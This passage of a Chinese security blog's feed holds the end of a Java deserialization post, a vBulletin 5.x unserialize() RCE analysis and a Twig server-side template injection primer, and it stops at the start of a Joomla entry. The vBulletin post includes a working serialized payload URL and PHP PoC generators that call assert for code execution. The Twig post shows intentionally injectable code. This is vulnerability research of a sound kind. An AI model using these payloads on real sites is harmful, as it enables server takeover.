title="五、总结"></a>五、总结</h3><p>由于水平有限，暂时只能笔止于此。要清楚反序列化问题不单单存在于某种语言里，而是目前的大多数实现了序列化接口的语言都没有对反序列化的对象做安全检查，虽然官方都有文档说不要对不可信的输入数据进行反序列化，但是往往一些框架就喜欢使用序列化来方便不同应用或者平台之间对象的传递，这就促使了反序列化漏洞的形成。</p><p>基于 Apache Commons Collections 通用库构造远程命令执行的 POP Gadget 只能说是 Java 反序列化漏洞利用中的一枚辅助炮弹而已，如果不从根本上加强反序列化的安全策略，以后还会涌现出更多通用库或者框架的 POP Gadget 能够进行有效的利用。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.youtube.com/watch?v=KSA7vUkXGSg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=KSA7vUkXGSg</a></li><li><a href="http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles" target="_blank" rel="noopener">http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles</a></li><li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#background" target="_blank" rel="noopener">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#background</a></li><li><a href="http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/" target="_blank" rel="noopener">http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/</a></li><li><a href="https://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html#8130" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html#8130</a></li><li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html" target="_blank" rel="noopener">http://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html</a></li><li><a href="http://www.javaworld.com/article/2072752/the-java-serialization-algorithm-revealed.html" target="_blank" rel="noopener">http://www.javaworld.com/article/2072752/the-java-serialization-algorithm-revealed.html</a></li><li><a href="https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf" target="_blank" rel="noopener">https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;作为一名不会 Java %!@#&amp;amp;，仅以此文记录下对 Java 反序列化利用的学习和研究过程。&lt;/p&gt;
&lt;h3 id=&quot;一、什么是序列化&quot;&gt;&lt;a href=&quot;#一、什么是序列化&quot; class=&quot;headerlink&quot; title=&quot;一、什么是序列化&quot;&gt;&lt;/a&gt;一、什
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
      <category term="java" scheme="http://rickgray.me/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>unserialize() 实战之 vBulletin 5.x.x 远程代码执行</title>
    <link href="http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/"/>
    <id>http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/</id>
    <published>2015-11-05T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.517Z</updated>
    
    <content type="html"><![CDATA[<p>vBulletin 的一枚 RCE 利用和简要的分析被曝光，产生漏洞的原因源于 vBulletin 程序在处理 Ajax API 调用的时候，使用 <code>unserialize()</code> 对传递的参数值进行了反序列化操作，导致攻击者使用精心构造出的 Payload 直接导致代码执行。关于 PHP 中反序列化漏洞的问题可以参考 OWASP 的<a href="https://www.owasp.org/index.php/PHP_Object_Injection" target="_blank" rel="noopener">《PHP Object Injection》</a>。</p><p>使用 <a href="http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq" target="_blank" rel="noopener">原文</a> 提供的 Payload 可以直接在受影响的站点上执行 <code>phpinfo(1)</code>：</p><p><img src="/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/1.png" alt=""></p><p>具体 Payload 的构造过程也文中有所提及，但是笔者在对 vBulletin 5.1.x 版本进行测试的时候，发现原本的 Payload 并不能成功，甚是疑惑。然而在深入分析后，发现在具体利用的时候还需要结合 vBulletin 程序本身的一些代码结构才能得到一个较为通用的 Payload，通过下面的分析后就能够明白。</p><h3 id="一、反序列化触发点跟踪"><a href="#一、反序列化触发点跟踪" class="headerlink" title="一、反序列化触发点跟踪"></a>一、反序列化触发点跟踪</h3><p>虽然此次漏洞 <code>unserialize()</code> 函数的触发在曝光的文章中已经描述的很清楚了，并且对整个关键代码的触发流程也进行了说明，但是在深入跟踪和分析时，觉得还是有值得注意和学习的地方。</p><pre><code>http://172.16.96.130/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D</code></pre><p>通过观察服务端在处理PHP时的调用栈，可知服务端在处理上述请求时，会将 <code>ajax/api/hook/decodeArguments</code> 作为路由参数 <code>$_REQUEST[&#39;routestring&#39;]</code> 传递给地址路由处理过程。因其符合 <code>ajax/api/[controller]/[method]</code> 的 Ajax API 请求路由格式，会再调用 <code>vB5_Frontend_ApplicationLight</code> 实例中的 <code>handleAjaxApi()</code> 函数来进行相应的模块加载并调用处理函数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">handleAjaxApi</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$routeInfo = explode(<span class="string">'/'</span>, $_REQUEST[<span class="string">'routestring'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (count($routeInfo) &lt; <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">'ajax'</span>, <span class="string">'api'</span>, <span class="keyword">array</span>(), <span class="string">'invalid_request'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$params = array_merge($_POST, $_GET);</span><br><span class="line"><span class="keyword">$this</span>-&gt;sendAsJson(Api_InterfaceAbstract::instance(Api_InterfaceAbstract::API_LIGHT)-&gt;callApi($routeInfo[<span class="number">2</span>], $routeInfo[<span class="number">3</span>], $params, <span class="keyword">true</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请求的 <code>ajax/api/hook/decodeArguments</code> 会实例化 <code>hook</code> 类然后调用 <code>decodeArguments()</code> 函数，原文中所提及的触发点就在此处：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decodeArguments</span><span class="params">($arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($args = @unserialize($arguments))</span><br><span class="line">&#123;</span><br><span class="line">$result = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($args <span class="keyword">AS</span> $varname =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">$result .= $varname;</span><br></pre></td></tr></table></figure><p>通过反序列化，我们可以使之能生成在执行环境上下文中已经定义好了的类实例，并通过寻找一个含有 <code>__wakeup()</code> 或者 <code>__destruct()</code> 魔术方法存在问题的类来进行利用。然后原文中所提到的利用方法并不是这样，其使用的是继承于 PHP 迭代器类型的 <code>vB_dB_Result</code> 类，由于 <code>$args = @unserialize($arguments)</code> 产生了一个迭代器 <code>vB_dB_Result</code> 类实例，因此在后面进行 <code>foreach</code> 操作时会首先调用其 <code>rewind()</code> 函数。</p><p>而在 <code>rewind()</code> 函数处理过程中，会根据实例变量状态进行调用：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rewind</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;recordset)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;free_result(<span class="keyword">$this</span>-&gt;recordset);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就可以通过反序列化来控制 <code>$this-&gt;recordset</code> 的值，并且 <code>$this-&gt;db-&gt;free_result</code> 最终会调用：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">free_result</span><span class="params">($queryresult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;sql = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">return</span> @<span class="keyword">$this</span>-&gt;functions[<span class="string">'free_result'</span>]($queryresult);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;functions[&#39;free_result&#39;]</code> 原本的初始化值为 <code>mysql_free_result</code>，但是由于反序列化的原因，我们也能控制 <code>vB_dB_Result</code> 类实例中的 <code>db</code> 成员，更改其对应的 <code>functions[&#39;free_result&#39;]</code> 为我们想要执行的函数，因此一个任意代码执行就产生了。</p><h3 id="二、利用分析和完善"><a href="#二、利用分析和完善" class="headerlink" title="二、利用分析和完善"></a>二、利用分析和完善</h3><p>观察一下原文中提供的 Payload 构造 PoC：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_Database</span> </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> $functions = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;functions[<span class="string">'free_result'</span>] = <span class="string">'phpinfo'</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_dB_Result</span> </span>&#123;</span><br><span class="line">       <span class="keyword">protected</span> $db;</span><br><span class="line">       <span class="keyword">protected</span> $recordset;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> vB_Database();</span><br><span class="line">               <span class="keyword">$this</span>-&gt;recordset = <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urlencode(serialize(<span class="keyword">new</span> vB_dB_Result())) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure><p>通过第一部分的分析，我们已经清楚了整个漏洞的函数调用过程和原因，并且也已经得知哪些参数可以得到控制和利用。因此这里我们修改 <code>$this-&gt;functions[&#39;free_result&#39;] = &#39;assert&#39;;</code> 和 <code>$this-&gt;recordset = &#39;var_dump(md5(1))&#39;;</code>，最终远程代码执行的的函数则会是 <code>assert(&#39;var_dump(md5(1))&#39;)</code>：</p><p><img src="/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/2.png" alt=""></p><p>这个时候其实 RCE 已经非常的顺利了，但是在进行测试的时候却发现了原文所提供的 PoC 只能复现 5.0.x 版本的 vBulletin，而 5.1.x 版本的却不可以。通过本地搭建测试环境，并使用同样的 PoC 去测试，发现在 5.1.x 版本中 <code>vB_Database</code> 被定义成了抽象类：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">vB_Database</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The type of result set to return from the database for a specific row.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>抽象类是不能直接进行实例化的，原文提供的 PoC 却是实例化的 <code>vB_Database</code> 类作为 <code>vB_dB_Result</code> 迭代器成员 <code>db</code> 的值，在服务端进行反序列化时会因为需要恢复实例为抽象类而导致失败：</p><p><img src="/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/3.png" alt=""></p><p>这就是为什么在 5.1.x 版本上 PoC 会不成功的原因。然后要解决这个问题也很容易，通过跟踪调用栈，发现程序在反序列化未定义类时会调用程序注册的 <code>autoload()</code> 方法去动态加载类文件。这里 vBulletin 会依次调用 <code>includes/vb5/autoloader.php</code> 中的 <code>_autoload</code> 方法和 <code>core/vb/vb.php</code> 中的 <code>autoload()</code> 方法，成功加载即返回，失败则反序列化失败。所以要想继续使用原有 PoC 的思路来让反序列化后会执行 <code>$this-&gt;db-&gt;free_result($this-&gt;recordset);</code> 则需要找到一个继承于 <code>vB_Database</code> 抽象类的子类并且其源码文件路径能够在 autoload 过程中得到加载。</p><p>通过搜索，发现有如下类继承于 <code>vB_Database</code> 抽象类及其源码对应的路径：</p><p><img src="/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/4.png" alt=""></p><p>而终代码进行进行 autoload 的时候会解析传递的类名来动态构造尝试加载的源码文件路径：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">...省略</span><br><span class="line">$fname = str_replace(<span class="string">'_'</span>, <span class="string">'/'</span>, strtolower($class)) . <span class="string">'.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">self</span>::$_paths <span class="keyword">AS</span> $path)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (file_exists($path . $fname))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($path . $fname);</span><br><span class="line"><span class="keyword">if</span> (class_exists($class, <span class="keyword">false</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码存在于第一次调用的 <code>__autoload()</code> 里，可以看到对提供的类名以 <code>_</code> 进行了拆分，动态构造了加载路径（第二次 autoload() 的过程大致相同），简单分析一下就可以发现只有在反序列化 <code>vB_Database_MySQL</code> 和 <code>vB_Database_MySQLi</code> 这两个基于 <code>vB_Database</code> 抽象类的子类时，才能成功的动态加载其类定义所在的源码文件使得反序列化成功执行，最终才能控制参数进行任意代码执行。</p><p>所以，针对 5.1.x 版本 vBulletin 的 PoC 就可以得到了，使用 <code>vB_Database_MySQL</code> 或者 <code>vB_Database_MySQLi</code> 作为迭代器 <code>vB_dB_Result</code> 成员 <code>db</code> 的值即可。具体 PoC 如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_Database_MySQL</span> </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> $functions = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;functions[<span class="string">'free_result'</span>] = <span class="string">'assert'</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_dB_Result</span> </span>&#123;</span><br><span class="line">       <span class="keyword">protected</span> $db;</span><br><span class="line">       <span class="keyword">protected</span> $recordset;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> vB_Database_MySQL();</span><br><span class="line">               <span class="keyword">$this</span>-&gt;recordset = <span class="string">'print("This Vuln In 5.1.7")'</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urlencode(serialize(<span class="keyword">new</span> vB_dB_Result())) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure><p>测试一下，成功执行 <code>assert(&#39;print(&quot;This Vuln In 5.1.7&quot;)&#39;)</code>：</p><p><img src="/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/5.png" alt=""></p><p>当然了，PoC 不止上面所提供的这一种写法，仅供参考而已。</p><h3 id="三、小结"><a href="#三、小结" class="headerlink" title="三、小结"></a>三、小结</h3><p>此次 vBulletin 5.x.x RCE 漏洞的曝光，从寻找触发点到对象的寻找，再到各种自动加载细节，不得不说是一个很好的 PHP 反序列化漏洞实战实例。不仔细去分析真的不能发现原作者清晰的思路和对程序的熟悉程度。</p><p>另外，<a href="http://blog.checkpoint.com/" target="_blank" rel="noopener">Check Point</a> 在其官方博客上也公布了反序列化的另一个利用点，通过反序列化出一个模版对象最终调用 <code>eval()</code> 函数进行执行（<a href="http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/" target="_blank" rel="noopener">原文</a>）。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq" target="_blank" rel="noopener">http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq</a></li><li><a href="https://www.owasp.org/index.php/PHP_Object_Injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/PHP_Object_Injection</a></li><li><a href="http://php.net/manual/en/class.iterator.php" target="_blank" rel="noopener">http://php.net/manual/en/class.iterator.php</a></li><li><a href="http://www.php.net/manual/en/function.autoload.php" target="_blank" rel="noopener">http://www.php.net/manual/en/function.autoload.php</a></li><li><a href="http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/" target="_blank" rel="noopener">http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/</a></li><li><a href="http://www.sebug.net/vuldb/ssvid-89707" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89707</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;vBulletin 的一枚 RCE 利用和简要的分析被曝光，产生漏洞的原因源于 vBulletin 程序在处理 Ajax API 调用的时候，使用 &lt;code&gt;unserialize()&lt;/code&gt; 对传递的参数值进行了反序列化操作，导致攻击者使用精心构造出的 Paylo
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
      <category term="php" scheme="http://rickgray.me/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>服务端模板注入攻击 (SSTI) 之浅析</title>
    <link href="http://rickgray.me/2015/11/03/server-side-template-injection-attack-analysis/"/>
    <id>http://rickgray.me/2015/11/03/server-side-template-injection-attack-analysis/</id>
    <published>2015-11-02T16:00:00.000Z</published>
    <updated>2018-04-24T17:55:42.287Z</updated>
    
    <content type="html"><![CDATA[<p>在今年的黑帽大会上 <a href="http://blog.portswigger.net/" target="_blank" rel="noopener">James Kettle</a> 讲解了 <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">《Server-Side Template Injection: RCE for the modern webapp》</a>，从服务端模板注入的形成到检测，再到验证和利用都进行了详细的介绍。本文在理解原文内容的基础上，结合更为具体的示例对服务端模板注入的原理和扫描检测方法做一个浅析。</p><h3 id="一、模板注入与常见Web注入"><a href="#一、模板注入与常见Web注入" class="headerlink" title="一、模板注入与常见Web注入"></a>一、模板注入与常见Web注入</h3><p>就注入类型的漏洞来说，常见 Web 注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。注入漏洞的实质是服务端接受了用户的输入，未过滤或过滤不严谨执行了拼接了用户输入的代码，因此造成了各类注入。下面这段代码足以说明这一点：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SQL 注入</span></span><br><span class="line">$query = <span class="string">"select * from sometable where id="</span>.$_GET[<span class="string">'id'</span>];</span><br><span class="line">mysql_query($query);</span><br><span class="line"></span><br><span class="line">------------- 华丽的分割线 -------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模版注入</span></span><br><span class="line">$temp-&gt;render(<span class="string">"Hello "</span>.$_GET[<span class="string">'username'</span>]);</span><br></pre></td></tr></table></figure><p>而服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><h3 id="二、模板注入原理"><a href="#二、模板注入原理" class="headerlink" title="二、模板注入原理"></a>二、模板注入原理</h3><p>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程，这里我们使用 PHP 模版引擎 <a href="http://twig.sensiolabs.org/" target="_blank" rel="noopener">Twig</a> 作为例子来说明模板注入产生的原理。</p><p>考虑下面这段代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;&#123;name&#125;&#125;"</span>, <span class="keyword">array</span>(<span class="string">"name"</span> =&gt; $_GET[<span class="string">"name"</span>]));  <span class="comment">// 将用户输入作为模版变量的值</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure><p>使用 Twig 模版引擎渲染页面，其中模版含有 <code>{{name}}</code> 变量，其模版变量值来自于 GET 请求参数 <code>$_GET[&quot;name&quot;]</code>。显然这段代码并没有什么问题，即使你想通过 <code>name</code> 参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击：</p><p><img src="/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/1.png" alt=""></p><p>但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure><p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见：</p><p><img src="/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/2.png" alt=""></p><p>对比上面两种情况，简单的说服务端模板注入的形成终究还是因为服务端相信了用户的输出而造成的（Web安全真谛：永远不要相信用户的输入！）。当然了，第二种情况下，攻击者不仅仅能插入 JavaScript 脚本，还能针对模板框架进行进一步的攻击，此部分只说明原理，在后面会对攻击利用进行详细说明和演示。</p><h3 id="三、模板注入检测"><a href="#三、模板注入检测" class="headerlink" title="三、模板注入检测"></a>三、模板注入检测</h3><p>上面已经讲明了模板注入的形成原来，现在就来谈谈对其进行检测和扫描的方法。如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。</p><p>借用本文第二部分所用到的代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure><p>在 Twig 模板引擎里，<code>{{ var }}</code> 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 <code>name={{2*10}}</code>，则在服务端拼接的模版内容为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello &#123;&#123;2*10&#125;&#125;</span><br></pre></td></tr></table></figure><p>Twig 模板引擎在编译模板的过程中会计算 <code>{{2*10}}</code> 中的表达式 <code>2*10</code>，会将其返回值 <code>20</code> 作为模板变量的值输出，如下图：</p><p><img src="/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/3.png" alt=""></p><p>现在把测试的数据改变一下，插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IsVuln&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure><p>实际服务端要进行编译的模板就被构造为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello IsVuln&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure><p>这里简单分析一下，由于 <code>{# comment #}</code> 作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 <code>{{2*8}}</code> 作为模板变量最终会返回 <code>16</code> 作为其值进行显示，因此前端最终会返回内容 <code>Hello IsVuln16OK</code>，如下图：</p><p><img src="/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/4.png" alt=""></p><p>通过上面两个简单的示例，就能得到 SSTI 扫描检测的大致流程（这里以 Twig 为例）：</p><p><img src="/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/5.png" alt=""></p><p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p><p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p><h3 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h3><p>本文简单介绍服务端模版注入漏洞如常规 Web 注入漏洞之间的关系，分析了其产生的原理，并以 PHP 模板引擎 Twig 为例讲解了 SSTI 常规的扫描和检测方法。虽然说 SSTI 并不广泛存在，但如果开发人员滥用模板引擎，进行不安全的编码，这样 Web 应用就可能出现 SSTI，并且根据其模板引擎的复杂性和开发语言的特性，可能会造成非常严重的问题。</p><p>在后续的文章中会针对各语言流行的模板引擎做一个较为详细的研究和分析，给出对应的可利用点和方法。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></li><li><a href="https://www.youtube.com/watch?time_continue=1342&amp;v=BGsAguMPtFw" target="_blank" rel="noopener">https://www.youtube.com/watch?time_continue=1342&amp;v=BGsAguMPtFw</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在今年的黑帽大会上 &lt;a href=&quot;http://blog.portswigger.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;James Kettle&lt;/a&gt; 讲解了 &lt;a href=&quot;https://www.blackhat.com/do
      
    
    </summary>
    
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
      <category term="php" scheme="http://rickgray.me/tags/php/"/>
    
      <category term="ssti" scheme="http://rickgray.me/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析</title>
    <link href="http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/"/>
    <id>http://rickgray.me/2015/10/23/joomla_cms_contenthistory_sql_injection_vulnerability/</id>
    <published>2015-10-22T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.517Z</updated>
    
